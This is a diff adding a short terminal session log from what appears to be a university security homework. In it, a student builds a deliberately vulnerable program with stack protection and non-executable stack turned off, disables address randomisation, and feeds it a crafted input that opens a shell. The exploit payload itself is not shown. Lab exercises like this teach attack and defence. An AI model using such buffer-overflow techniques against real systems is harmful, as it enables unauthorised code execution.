@@ -1,0 +1,25 @@
+Script started on Fri 26 Sep 2014 07:00:52 PM EDT
+chaig@spec15:~/Documents/CIS551/HW1_Part3> make attack
+gcc -o mod_badbuf mod_badbuf.c
+./mod_badbuf <ipToMod >opOfMod || :
+gcc -fno-stack-protector -z execstack badbuf.c -g -o badbuf
+gcc -o ip inputPart3.c
+./ip  || :
+
+the address I got = 7fffffffdfb0
+(cat ipPart3; cat) | setarch `arch` -R ./badbuf
+
+
+ls
+a.out	  classic.sh  exitshell.c   ip	     ipToMod	   makefile	 opOfMod  shell.c    shellcode.c
+badbuf	  exit.c      inputPart3    ip3      log.txt	   mod_badbuf	 pwAddr   shellasm
+badbuf.c  exitshell   inputPart3.c  ipPart3  logPart3.txt  mod_badbuf.c  shell	  shellcode
+
+whoami
+chaig
+
+^Cmake: *** [attack] Interrupt
+
+chaig@spec15:~/Documents/CIS551/HW1_Part3> exit
+
+Script done on Fri 26 Sep 2014 07:01:20 PM EDT
